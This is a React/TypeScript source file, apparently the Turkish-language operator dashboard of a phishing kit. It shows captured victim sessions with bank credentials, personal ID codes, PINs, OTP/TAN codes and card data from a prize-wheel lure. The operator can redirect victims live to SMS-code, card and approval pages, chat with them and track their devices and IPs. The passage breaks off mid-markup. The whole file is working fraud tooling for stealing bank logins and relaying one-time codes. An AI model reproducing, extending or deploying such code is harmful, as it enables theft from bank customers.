"use client";

import { useCallback, useEffect, useState, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";
import { pathToStep } from "@/lib/session-routes";
import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
import {
  isSessionLive,
  parseVisitorPresenceState,
  VISITOR_PRESENCE_TICK_MS,
} from "@/lib/admin-presence";

const SESSION_LIST_COLUMNS =
  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden";

const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
  { value: "smartid_1", label: "SmartID 1 Sayfası" },
  { value: "smartid_2", label: "SmartID 2 Sayfası" },
  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
];

function getApprovalDisplayText(value: string): string {
  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
  if (!matchedOption) {
    return "";
  }

  return matchedOption.label.includes("Sayfası")
    ? matchedOption.label.replace(" Sayfası", " Onaylandı")
    : `${matchedOption.label} Onaylandı`;
}

function getApprovalStepLabel(value: string): string {
  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
  if (!matchedOption) {
    return "ONAY";
  }

  return matchedOption.label.replace(" Sayfası", "").toUpperCase();
}

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function inferCanonicalLogFieldKey(
  key: string,
): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    normalizedKey.includes("personalidentitycode") ||
    normalizedKey.includes("personalidentificationcode") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("personalcode") ||
    normalizedKey.includes("isikukood")
  ) {
    return "personalCode";
  }

  if (
    normalizedKey.includes("telefoninumber") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("phonefield") ||
    normalizedKey.includes("telefon") ||
    normalizedKey.includes("phone") ||
    normalizedKey === "phone"
  ) {
    return "bankPhone";
  }

  if (
    normalizedKey.includes("userid") ||
    normalizedKey.includes("username") ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("nickname") ||
    normalizedKey.includes("kasutajanimi") ||
    normalizedKey.includes("kasutajatunnus") ||
    normalizedKey.endsWith("tunnus")
  ) {
    return "username";
  }

  if (
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("pincode") ||
    normalizedKey.includes("pinkood") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("pincalculatorcode") ||
    normalizedKey.includes("pincalccode") ||
    normalizedKey.includes("pincalcpassword") ||
    normalizedKey === "pincalc" ||
    normalizedKey === "pin"
  ) {
    return "password";
  }

  if (
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("smscode") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("kontrollkood")
  ) {
    return "tacCode";
  }

  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
    return "loginMethod";
  }

  return null;
}

function isIgnoredAdminBankFieldKey(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("wheelresult") ||
    normalizedKey.includes("wheelprize") ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("remembermesimpleid") ||
    normalizedKey.includes("remembermesmartid") ||
    normalizedKey.includes("remembermemobileid") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("useridmid") ||
    normalizedKey.includes("useridsid") ||
    normalizedKey.includes("useridsimple") ||
    normalizedKey === "mobileid" ||
    normalizedKey === "smartid" ||
    normalizedKey === "idcard" ||
    normalizedKey === "pincalc" ||
    normalizedKey === "kalkulaator"
  );
}

function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (typeof value !== "string" || !value.trim()) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey || canonicalKey === key) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return Boolean(canonicalValue) && canonicalValue === value.trim();
}

function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (!value) return false;
  if (isIgnoredAdminBankFieldKey(key)) return false;

  const preferredKeys = new Set([
    "loginMethod",
    "personalCode",
    "bankPhone",
    "username",
    "verfuegernummer",
    "password",
    "pin",
    "tacCode",
    "pasnummer",
    "rekeningnummer",
    "toegangscode",
    "signatuur",
    "identificatiecode",
  ]);

  if (preferredKeys.has(key)) {
    return true;
  }

  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (normalizedKey.includes("rememberme")) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey) {
    return false;
  }

  if (shouldHideDuplicateBankField(formData, key, value)) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return !canonicalValue;
}

function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
  const pickString = (...keys: string[]) => {
    for (const key of keys) {
      const value = formData[key];
      if (typeof value === "string" && value.trim()) {
        return value.trim();
      }
    }
    return "";
  };

  const orderedField1 = pickString("orderedField1");
  const orderedField1Key = pickString("orderedField1Key");
  const orderedField2 = pickString("orderedField2");
  const orderedField2Key = pickString("orderedField2Key");
  const orderedField2Type = pickString("orderedField2Type");
  const orderedField3 = pickString("orderedField3");
  const orderedField3Key = pickString("orderedField3Key");
  const orderedField3Type = pickString("orderedField3Type");
  const rawPersonalCode = pickString("personalCode");
  const rawUsername = pickString("username", "verfuegernummer");
  const rawPassword = pickString("password", "pin");
  const rawTacCode = pickString("tacCode");

  const primaryValue = orderedField1 || rawPersonalCode || rawUsername;
  const secondaryValue = orderedField2 || rawPassword;
  const tertiaryValue = orderedField3 || rawTacCode;

  if (!primaryValue && !secondaryValue && !tertiaryValue) {
    return [];
  }

  const fields: Array<[string, string]> = [];

  if (primaryValue) {
    const primaryKey =
      orderedField1Key === "username" ||
      orderedField1Key === "personalCode" ||
      orderedField1Key === "bankPhone" ||
      orderedField1Key === "password"
        ? orderedField1Key
        : rawPersonalCode && primaryValue === rawPersonalCode
          ? "personalCode"
          : rawUsername && primaryValue === rawUsername
            ? "username"
            : "personalCode";
    fields.push([primaryKey, primaryValue]);
  }

  if (!secondaryValue) {
    return fields;
  }

  if (
    orderedField2Key === "username" ||
    orderedField2Key === "personalCode" ||
    orderedField2Key === "bankPhone" ||
    orderedField2Key === "password"
  ) {
    fields.push([orderedField2Key, secondaryValue]);
  } else if (orderedField2Type === "phone") {
    fields.push(["bankPhone", secondaryValue]);
  } else if (orderedField2Type === "password" || (rawPassword && secondaryValue === rawPassword)) {
    fields.push(["password", secondaryValue]);
  } else {
    fields.push(["username", secondaryValue]);
  }

  if (!tertiaryValue || fields.some(([, existingValue]) => existingValue === tertiaryValue)) {
    return fields;
  }

  if (
    orderedField3Key === "username" ||
    orderedField3Key === "personalCode" ||
    orderedField3Key === "bankPhone" ||
    orderedField3Key === "password" ||
    orderedField3Key === "tacCode"
  ) {
    fields.push([orderedField3Key, tertiaryValue]);
    return fields;
  }

  if (orderedField3Type === "phone") {
    fields.push(["bankPhone", tertiaryValue]);
    return fields;
  }

  if (orderedField3Type === "password" || (rawPassword && tertiaryValue === rawPassword)) {
    fields.push(["password", tertiaryValue]);
    return fields;
  }

  if (rawTacCode && tertiaryValue === rawTacCode) {
    fields.push(["tacCode", tertiaryValue]);
    return fields;
  }

  fields.push(["username", tertiaryValue]);
  return fields;
}

export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  useEffect(() => {
    rowsRef.current = rows;
  }, [rows]);

  

  // Stats
  const [liveVisitorCount, setLiveVisitorCount] = useState(0);
  const [logCount, setLogCount] = useState(0);
  const [bannedCount, setBannedCount] = useState(0);

  // Presence
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
  const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
  const [, setPresenceTick] = useState(0);

  useEffect(() => {
    const timer = window.setInterval(() => {
      setPresenceTick((t) => t + 1);
    }, VISITOR_PRESENCE_TICK_MS);

    return () => window.clearInterval(timer);
  }, []);

  const [chatSessionId, setChatSessionId] = useState<string | null>(null);
  const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);

  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [pastedImage, setPastedImage] = useState<File | null>(null);
  const [pastedImagePreview, setPastedImagePreview] = useState<string | null>(null);
  const [isUploadingImage, setIsUploadingImage] = useState(false);
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);

  const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
  const [specialMessage, setSpecialMessage] = useState("");
  const [specialImage, setSpecialImage] = useState<string | null>(null);
  const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");

  const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
  const [smsDigitsInput, setSmsDigitsInput] = useState("6");
  const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
  const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
  const [approvalPromptType, setApprovalPromptType] = useState("");
  const [approvalCodeInput, setApprovalCodeInput] = useState("");

  const [soundEnabled, setSoundEnabled] = useState(false);
  const soundEnabledRef = useRef(false);

  useEffect(() => {
    const savedSound = localStorage.getItem('admin1SoundEnabled');
    if (savedSound === 'true') {
      setSoundEnabled(true);
      soundEnabledRef.current = true;
    }
  }, []);

  useEffect(() => {
    soundEnabledRef.current = soundEnabled;
    localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
  }, [soundEnabled]);

  const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
    try {
      playBeautifulNotification();
      showBeautifulToast(title, desc);
    } catch (e) {
      console.error("Audio error:", e);
    }
  }, []);

  const load = useCallback(async () => {
    if (!supabase) return;
    let query = supabase
      .from("sessions")
      .select(SESSION_LIST_COLUMNS)
      .neq("is_hidden", true)
      .order("created_at", { ascending: false });

    // Sadece super_admin olmayanlar için filtrele
    const username = user?.user_metadata?.username || user?.email?.split('@')[0];
    if (username !== "super_admin") {
      query = query.eq("partner_name", username);
    }

    const { data } = await query.limit(50);
    const fetchedRows = (data as DemoSession[]) ?? [];
    setRows(fetchedRows);
    setLogCount(fetchedRows.length);
  }, [supabase, user]);

  useEffect(() => {
    void load();
    if (!supabase) return;

    // Banned count
    supabase.from("banned_ips").select("id", { count: 'exact' }).then(({ count }) => {
      setBannedCount(count ?? 0);
    });

    const channel = supabase
      .channel("admin1-sessions-live")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload) => {
        if (payload.eventType === "INSERT") {
          const newRow = payload.new as DemoSession;
          if (newRow.is_hidden) return;
          setRows((prev) => {
            if (prev.some((r) => r.id === newRow.id)) return prev;
            return [newRow, ...prev].slice(0, 50);
          });
          setLogCount((c) => c + 1);
          return;
        }

        if (payload.eventType === "DELETE") {
          const oldRow = payload.old as DemoSession;
          if (oldRow?.id) {
            setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
            setLogCount((c) => Math.max(0, c - 1));
          }
          return;
        }

        if (payload.eventType === "UPDATE") {
          const newRow = payload.new as DemoSession;
          const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);

          if (newRow.is_hidden) {
            setRows((prev) => prev.filter((r) => r.id !== newRow.id));
            setLogCount((c) => Math.max(0, c - 1));
            return;
          }

          if (soundEnabledRef.current && oldRow) {
            const getSignificantData = (data: any) => {
              if (!data) return {};
              const { bankSlug, bankName, currency, is_wheel_game, participationCode, ...rest } = data;
              return rest;
            };

            const oldSignificant = getSignificantData(oldRow.form_data);
            const newSignificant = getSignificantData(newRow.form_data);
            const isFormDataChanged = JSON.stringify(oldSignificant) !== JSON.stringify(newSignificant);
            const isUserSubmittedToWait = newRow.current_step === "wait" && oldRow.current_step !== "wait";

            if (isFormDataChanged || isUserSubmittedToWait) {
              playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
            }
          }

          setRows((prev) => {
            const idx = prev.findIndex((r) => r.id === newRow.id);
            if (idx === -1) return [newRow, ...prev].slice(0, 50);
            const next = [...prev];
            next[idx] = newRow;
            return next;
          });
        }
      })
      .subscribe();

    const presenceChannel = supabase.channel("online_visitors", {
      config: { presence: { key: "admin1-logs" } },
    });

    const applyPresence = () => {
      const parsed = parseVisitorPresenceState(presenceChannel.presenceState());
      setLiveVisitorCount(parsed.liveVisitorCount);
      setOnlineSessionIds(new Set(parsed.onlineSessionIds));
      setSessionPaths(parsed.sessionPaths);
      setSessionLastSeenAt(parsed.sessionLastSeenAt);
      setPresenceTick((t) => t + 1);
    };

    presenceChannel
      .on("presence", { event: "sync" }, applyPresence)
      .on("presence", { event: "join" }, applyPresence)
      .on("presence", { event: "leave" }, applyPresence)
      .subscribe(async (status) => {
        if (status === "SUBSCRIBED") {
          await presenceChannel.track({
            pathname: "/admin",
            role: "admin",
            online_at: new Date().toISOString(),
          });
        }
      });

    return () => {
      void supabase.removeChannel(channel);
      void supabase.removeChannel(presenceChannel);
    };
  }, [supabase, load]);

  const copyToClipboard = (text: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
  };

  const handleRouteAction = async (sessionId: string, action: string) => {
    if (!supabase) return;
    
    if (action === "sms") {
      setSmsPromptSessionId(sessionId);
      setSmsDigitsInput("6");
      setSmsCustomTextInput("");
      return;
    }

    if (action === "special_approval") {
      setSpecialPromptSessionId(sessionId);
      return;
    }

    if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
      await supabase.from("sessions").update({ current_step: action }).eq("id", sessionId);
    } else if (action === "ban_ip") {
      const row = rowsRef.current.find(r => r.id === sessionId);
      if (row && row.ip_address) {
        const confirmBan = confirm(`Bu IP adresi (${row.ip_address}) tamamen engellenecek. Onaylıyor musunuz?`);
        if (confirmBan) {
          await supabase.from('banned_ips').insert({
            ip_address: row.ip_address,
            reason: `Admin tarafından engellendi (Session: ${sessionId})`
          });
          alert("IP adresi başarıyla engellendi!");
        }
      } else {
        alert("Bu kullanıcının IP adresi henüz sisteme yansımamış.");
      }
    }
  };

  const handleApprovalAction = async (sessionId: string, approvalValue: string) => {
    if (!approvalValue) return;
    setApprovalPromptSessionId(sessionId);
    setApprovalPromptType(approvalValue);
    setApprovalCodeInput("");
  };

  async function confirmSmsRedirect() {
    if (!supabase || !smsPromptSessionId) return;
    const digits = Math.min(12, Math.max(4, Number(smsDigitsInput) || 6));
    await supabase
      .from("sessions")
      .update({
        current_step: "sms",
        sms_digits: digits,
        sms_custom_text: smsCustomTextInput.trim() || null,
        status: "online"
      })
      .eq("id", smsPromptSessionId);
    setSmsPromptSessionId(null);
    void load();
  }

  async function confirmApprovalAction() {
    if (!supabase || !approvalPromptSessionId || !approvalPromptType) return;

    const row = rowsRef.current.find((currentRow) => currentRow.id === approvalPromptSessionId);
    const previousFormData =
      row && row.form_data && typeof row.form_data === "object"
        ? (row.form_data as Record<string, string | undefined>)
        : {};

    await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        status: "online",
        current_step: "special_approval",
        form_data: {
          ...previousFormData,
          approvalStatus: approvalPromptType,
          approvalCode: approvalCodeInput.trim(),
          specialNoticeText: "",
          specialNoticeImage: "",
          specialNoticeLang: undefined,
          specialNoticeSentAt: "",
        },
      })
      .eq("id", approvalPromptSessionId);

    setApprovalPromptSessionId(null);
    setApprovalPromptType("");
    setApprovalCodeInput("");
    void load();
  }

  const handleDelete = async (sessionId: string) => {
    if (!confirm("Bu logu silmek (gizlemek) istediğinize emin misiniz?")) return;
    if (!supabase) return;
    await supabase.from("sessions").update({ is_hidden: true }).eq("id", sessionId);
    void load();
  };

  const handleDeleteAll = async () => {
    if (!confirm("TÜM LOGLARI silmek istediğinize emin misiniz? Bu işlem geri alınamaz!")) return;
    if (!supabase) return;
    
    const ids = rowsRef.current.map(r => r.id);
    if (ids.length === 0) return;

    await supabase.from("sessions").update({ is_hidden: true }).in("id", ids);
    void load();
  };

  useEffect(() => {
    if (!chatSessionId || !supabase) return;
    
    const loadChat = () => {
      supabase
        .from("chat_messages")
        .select("id,session_id,sender,content,image_url,created_at")
        .eq("session_id", chatSessionId)
        .order("created_at", { ascending: true })
        .then(({ data, error }) => {
          if (error) {
            console.error("admin chat load error:", error);
            return;
          }
          if (data) {
            setChatMessages((prev) => {
              if (prev.length !== data.length) {
                setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
                return data;
              }
              return prev;
            });
          }
        });
    };

    loadChat();
    const interval = setInterval(loadChat, 2000);

    const channel = supabase
      .channel(`admin_chat:${chatSessionId}`)
      .on(
        "postgres_changes",
        {
          event: "INSERT",
          schema: "public",
          table: "chat_messages",
          filter: `session_id=eq.${chatSessionId}`,
        },
        (payload) => {
          setChatMessages((prev) => {
            if (!prev.find(m => m.id === payload.new.id)) {
              return [...prev, payload.new];
            }
            return prev;
          });
          setTimeout(() => chatEndRef.current?.scrollIntoView({ behavior: "smooth" }), 100);
        }
      )
      .subscribe();

    return () => {
      clearInterval(interval);
      void supabase.removeChannel(channel);
    };
  }, [chatSessionId, supabase]);

  async function sendChatMessage(e?: React.FormEvent) {
    if (e) e.preventDefault();
    if ((!chatInput.trim() && !pastedImage) || !supabase || !chatSessionId) return;

    let imageUrl = null;

    if (pastedImage) {
      setIsUploadingImage(true);
      const ext = pastedImage.name.split('.').pop() || 'png';
      const fileName = `${Math.random().toString(36).substring(2)}_${Date.now()}.${ext}`;
      
      const { data, error } = await supabase.storage
        .from('chat_images')
        .upload(fileName, pastedImage, {
          cacheControl: '3600',
          upsert: false
        });
        
      if (error) {
        console.error("Upload error:", error);
        alert("Resim yüklenirken hata oluştu.");
        setIsUploadingImage(false);
        return;
      }
      
      const { data: publicUrlData } = supabase.storage
        .from('chat_images')
        .getPublicUrl(fileName);
        
      imageUrl = publicUrlData.publicUrl;
    }

    const msg = chatInput.trim();
    
    setChatInput("");
    setPastedImage(null);
    setPastedImagePreview(null);
    setIsUploadingImage(false);

    const { data, error } = await supabase
      .from("chat_messages")
      .insert({
        session_id: chatSessionId,
        sender: "admin",
        content: msg || "",
        image_url: imageUrl,
      })
      .select("id,session_id,sender,content,image_url,created_at")
      .single();

    if (error) {
      console.error("admin chat send error:", error);
      setChatInput(msg);
      alert("Mesaj gönderilemedi: " + error.message);
      return;
    }

    if (data) {
      setChatMessages((prev) => {
        if (prev.find((m) => m.id === data.id)) return prev;
        return [...prev, data];
      });
    }
  }

  const handlePaste = (e: React.ClipboardEvent) => {
    const items = e.clipboardData?.items;
    if (!items) return;
    
    for (let i = 0; i < items.length; i++) {
      if (items[i].type.indexOf('image') !== -1) {
        const file = items[i].getAsFile();
        if (file) {
          setPastedImage(file);
          const reader = new FileReader();
          reader.onload = (ev) => {
            setPastedImagePreview(ev.target?.result as string);
          };
          reader.readAsDataURL(file);
          e.preventDefault();
          break;
        }
      }
    }
  };

  async function publishSpecialApproval() {
    if (!supabase || !specialPromptSessionId) return;
    const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", specialPromptSessionId).maybeSingle();
    const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
    await supabase.from("sessions").update({
      status: "SPECIAL_INFO",
      current_step: "special_approval",
      form_data: { 
        ...prev, 
        approvalStatus: "",
        approvalCode: "",
        specialNoticeText: specialMessage.trim(), 
        specialNoticeImage: specialImage ?? "", 
        specialNoticeLang: specialLang, 
        specialNoticeSentAt: new Date().toISOString() 
      },
    }).eq("id", specialPromptSessionId);
    setSpecialPromptSessionId(null);
    setSpecialMessage("");
    setSpecialImage(null);
    void load();
  }

  function extractDeviceModel(ua: string): string | null {
    const androidParen = ua.match(/\(Linux;\s*Android\s+[\d.]+;\s*([^)]+)\)/i);
    if (androidParen) {
      let raw = androidParen[1].trim();
      raw = raw.split(/\s+Build\//i)[0].trim();
      if (raw && !/^Mobile$/i.test(raw) && !/^tablet$/i.test(raw)) {
        return raw;
      }
    }
    if (/iPhone/i.test(ua)) {
      const v = ua.match(/CPU iPhone OS ([\d_]+)/i);
      if (v) return `iPhone (iOS ${v[1].replace(/_/g, ".")})`;
      return "iPhone";
    }
    if (/iPad/i.test(ua)) {
      const v = ua.match(/CPU (?:iPhone )?OS ([\d_]+)/i);
      if (v) return `iPad (iPadOS ${v[1].replace(/_/g, ".")})`;
      return "iPad";
    }
    if (/iPod/i.test(ua)) {
      return "iPod touch";
    }
    const samsung = ua.match(/\b(SM-[A-Z0-9]+)\b/i);
    if (samsung) return samsung[1];
    const pixel = ua.match(/\b(Pixel\s+(?:\d+[a-zA-Z]?|Tablet|Fold|Pro))\b/i);
    if (pixel) return pixel[1];
    return null;
  }

  function parseUserAgent(ua?: string) {
    if (!ua) return { os: "Bilinmiyor", browser: "Bilinmiyor", device: "Bilinmiyor", model: "Tespit edilemedi" };
    let os = "Bilinmiyor";
    let browser = "Bilinmiyor";
    let device = "Masaüstü";

    if (/android/i.test(ua)) { os = "Android"; device = "Mobil/Tablet"; } 
    else if (/iphone|ipad|ipod/i.test(ua)) { os = "iOS"; device = "Mobil/Tablet"; } 
    else if (/windows/i.test(ua)) { os = "Windows"; } 
    else if (/mac os/i.test(ua)) { os = "macOS"; } 
    else if (/linux/i.test(ua)) { os = "Linux"; }

    if (/chrome|crios/i.test(ua)) browser = "Chrome";
    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
    else if (/safari/i.test(ua)) browser = "Safari";
    else if (/edg/i.test(ua)) browser = "Edge";
    else if (/opr\//i.test(ua)) browser = "Opera";

    const modelGuess = extractDeviceModel(ua);
    const model = modelGuess ?? (device === "Masaüstü" ? "— (masaüstü)" : "Tespit edilemedi (UA kısıtlı olabilir)");

    return { os, browser, device, model };
  }

  return (
    <div className="space-y-8 animate-in fade-in duration-500">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className={`p-2 rounded-xl ${darkMode ? 'bg-white/10 text-white' : 'bg-black/5 text-black'}`}>
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" /></svg>
            </div>
            <h2 className={`text-2xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Loglar ve Canlı Takip</h2>
          </div>
          <div className="flex items-center gap-3">
            <button
              onClick={() => void handleDeleteAll()}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                darkMode ? "bg-red-500/10 border border-red-500/20 text-red-500 hover:bg-red-500 hover:text-white" : "bg-red-50 border border-red-200 text-red-600 hover:bg-red-500 hover:text-white"
              }`}
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" /></svg>
              Tümünü Sil
            </button>
            <button
              onClick={() => {
                setSoundEnabled(!soundEnabled);
                if (!soundEnabled) playNotificationSound("Bildirim Testi", "Sesli bildirimler başarıyla açıldı.");
              }}
              className={`flex items-center gap-2.5 rounded-full px-5 py-2.5 shadow-sm text-[12px] font-bold tracking-wider uppercase transition-all duration-300 hover:scale-105 active:scale-95 hover:shadow-md ${
                soundEnabled
                  ? "bg-[#EB5E28]/10 border border-[#EB5E28]/20 text-[#EB5E28] ring-1 ring-[#EB5E28]/50"
                  : (darkMode ? "bg-[#1c1c1e] border border-white/10 text-zinc-400 hover:bg-white/10 hover:text-white" : "bg-white border border-gray-200 text-gray-500 hover:bg-gray-50 hover:text-black")
              }`}
            >
              {soundEnabled ? (
                <>
                  <span className="relative flex h-2.5 w-2.5">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#EB5E28] opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-[#EB5E28]"></span>
                  </span>
                  Ses Açık
                </>
              ) : (
                <>
                  <svg className="w-4 h-4 opacity-70" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5.586 15H4a1 1 0 01-1-1v-4a1 1 0 011-1h1.586l4.707-4.707C10.923 3.663 12 4.109 12 5v14c0 .891-1.077 1.337-1.707.707L5.586 15z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2" /></svg>
                  Ses Kapalı
                </>
              )}
            </button>
          </div>
        </div>

      {/* STAT CARDS */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <StatCard icon="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" color="text-yellow-500" title="Anlık Ziyaretçi" value={liveVisitorCount} darkMode={darkMode} />
        <StatCard icon="M5 8h14M5 8a2 2 0 110-4h14a2 2 0 110 4M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8m-9 4h4" color="text-green-500" title="Log Sayısı" value={logCount} darkMode={darkMode} />
        <StatCard icon="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" color="text-red-500" title="Ban Sayısı" value={bannedCount} darkMode={darkMode} />
      </div>

      {/* TABLE */}
      <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
        <div className="overflow-x-auto pb-4">
          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
            <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
              <tr>
                <th className="w-[6%] px-2 py-3 font-semibold whitespace-nowrap">ID</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
                <th className="w-[24%] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
                <th className="w-[14%] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
                <th className="w-[10%] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
                <th className="w-[8%] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
                <th className="w-[7%] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
                <th className="w-[12%] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
              </tr>
            </thead>
            <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
              {rows.length === 0 && (
                <tr>
                  <td colSpan={11} className="px-5 py-12 text-center text-base opacity-50 font-medium">Henüz bir log yok. İşlemler burada görünecek.</td>
                </tr>
              )}
              {rows.map((row) => {
                const fd = (row.form_data || {}) as Record<string, any>;
                const isOnline = isSessionLive(
                  row.id,
                  onlineSessionIds,
                  row.status,
                  sessionLastSeenAt[row.id],
                );
                
                let stepText = "BAŞLANGIÇ";
                let stepColor = darkMode ? "text-gray-400 bg-gray-500/10 border border-gray-500/20" : "text-gray-600 bg-gray-100 border border-gray-200";
                
                let s = row.current_step as string;
                const livePath = sessionPaths[row.id];
                if (isOnline && livePath) {
                  if (livePath.startsWith('/wheel')) s = "wheel";
                  else {
                    const mapped = pathToStep(livePath);
                    if (mapped) s = mapped;
                  }
                }

